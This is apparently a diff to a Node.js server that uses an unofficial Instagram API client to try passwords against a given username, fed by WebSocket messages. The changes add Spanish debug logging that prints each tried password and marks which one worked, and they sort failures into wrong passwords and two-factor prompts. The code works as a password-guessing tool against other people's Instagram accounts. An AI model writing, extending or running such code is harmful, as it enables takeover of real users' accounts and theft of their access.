@@ -15,21 +15,35 @@ app.use(express.static('public'));
 async function testPassword(username, password) {
   const ig = new IgApiClient();
   try {
+    // Simular un dispositivo para la API
     ig.state.generateDevice(username);
+    console.log(`[DEBUG] Probando contraseña: ${password}`);
+
+    // Intentar iniciar sesión
     await ig.account.login(username, password);
+    console.log(`[DEBUG] ¡Contraseña correcta!: ${password}`);
     return { success: true, password };
   } catch (error) {
-    // Detectar si se requiere un código de 6 dígitos
+    console.error(`[DEBUG] Error con la contraseña ${password}:`, error.message);
+
+    // Detectar si se requiere un código de 6 dígitos (2FA)
     if (error.message.includes('two_factor_required')) {
       return { success: false, password, message: 'Se requiere un código de 6 dígitos para la verificación.' };
     }
+
+    // Detectar si la contraseña es incorrecta
+    if (error.message.includes('password')) {
+      return { success: false, password, message: 'Contraseña incorrecta.' };
+    }
+
+    // Otros errores
     return { success: false, password, message: error.message };
   }
 }
 
 // Manejo de conexiones WebSocket
 wss.on('connection', (ws) => {
-  console.log('New client connected');
+  console.log('[DEBUG] Nuevo cliente conectado');
 
   ws.on('message', async (message) => {
     const data = JSON.parse(message);
@@ -70,12 +84,12 @@ wss.on('connection', (ws) => {
   });
 
   ws.on('close', () => {
-    console.log('Client disconnected');
+    console.log('[DEBUG] Cliente desconectado');
   });
 });
 
 // Iniciar el servidor
 const PORT = process.env.PORT || 8080;
 server.listen(PORT, () => {
-  console.log(`Server running on http://localhost:${PORT}`);
+  console.log(`[DEBUG] Servidor ejecutándose en http://localhost:${PORT}`);
 });
